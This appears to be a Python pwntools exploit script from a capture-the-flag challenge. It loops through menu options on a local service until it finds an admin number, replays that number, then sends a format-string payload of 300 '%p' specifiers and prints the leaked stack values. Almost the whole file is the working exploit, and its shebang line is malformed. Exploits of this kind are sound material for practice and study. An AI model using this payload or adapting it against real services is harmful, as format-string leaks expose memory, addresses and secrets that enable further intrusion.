#!/usr.bin/python2

from pwn import *

target = remote("localhost",1234)
target.recvuntil(b">>> ")

for i in range(43):
    target.sendline(str(i))
    txt = target.recvuntil(">>> ").replace("\r","") # while dealing with online binaries sometimes \n is represented by \r\n which can delete some informations

    if "Something" in txt:
        adminNO = txt.split(":")[1].split('\n')[0].strip()
        print(adminNO)
        target.sendline(adminNO)
        target.recvuntil(': ')
        target.sendline("%p"*300)
        txt = target.recvuntil(b'Which')
        print(txt.split(": ")[1].replace('Which',"").replace("(nil)","")) # removing unnecessary bytes from txt
        break